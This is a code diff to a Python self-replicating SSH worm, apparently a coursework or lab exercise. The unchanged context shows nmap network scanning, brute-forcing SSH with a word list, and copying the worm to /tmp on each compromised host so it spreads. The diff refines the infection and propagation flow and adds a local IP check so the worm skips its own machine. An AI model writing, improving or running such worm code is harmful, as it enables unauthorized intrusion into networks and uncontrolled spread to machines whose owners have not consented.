@@ -3,6 +3,8 @@ import sys
 import nmap
 import os
 import os.path
+import socket, fcntl, struct
+import netifaces
 
 markerLocation = "/tmp/marker.txt"
 wormMessageLocation = "/tmp/wormMessage.txt"
@@ -64,6 +66,30 @@ def markSystem():
 	marker.close()
 
 
+def getMachineIp():
+	# Get all the network interfaces on the system
+	networkInterfaces = netifaces.interfaces()
+	
+	# The IP address
+	ipAddr = None
+	
+	# Go through all the interfaces
+	for netFace in networkInterfaces:
+		
+		# The IP address of the interface
+		addr = netifaces.ifaddresses(netFace)[2][0]['addr'] 
+		
+		# Get the IP address
+		if not addr == "127.0.0.1":
+			
+			# Save the IP addrss and break
+			ipAddr = addr
+			break	 
+			
+	return ipAddr
+	
+
+
 def attackHost(host):
 
 	global wordList
@@ -94,6 +120,12 @@ def startAttacking(wormLocation, isHost):
 
 	if isHost:
 		print network
+	else:
+		infectSystem()
+
+	markSystem()
+
+	currIp = getMachineIp()
 
 	for Host in network:
 		
@@ -102,7 +134,7 @@ def startAttacking(wormLocation, isHost):
 		if isHost:
 			print("SSH Info: %s" %(str(sshInfo)))
 		
-		if sshInfo:
+		if sshInfo and currIp != Host:
 
 			sftpClient = sshInfo[0].open_sftp()
 			sftpClient.put(wormLocation, "/tmp/" + "replicating_worm.py")
@@ -119,16 +151,14 @@ def main(argv):
 		if argv[1] == "-h":
 			print("Usage: python replicating_worm.py [-host | -h | -t]\n-host this si the host system don't attack!\n-h Shows help screen\n-t Will see if the functions work!\nDefault will attack host and spread\n")
 		elif argv[1] == "-host":
-			markSystem()
 			startAttacking("replicating_worm.py", True)
 		elif argv[1] == "-t":
 			print("Testing if everything works right")
+			print(isTargetInfected())
 		else:
 			print("Don't understand argument!!\nTry again please")
 	else:
 		if isTargetInfected() == False:
-			markSystem()
-			infectSystem()
 			startAttacking("/tmp/replicating_worm.py", False)
 	
 
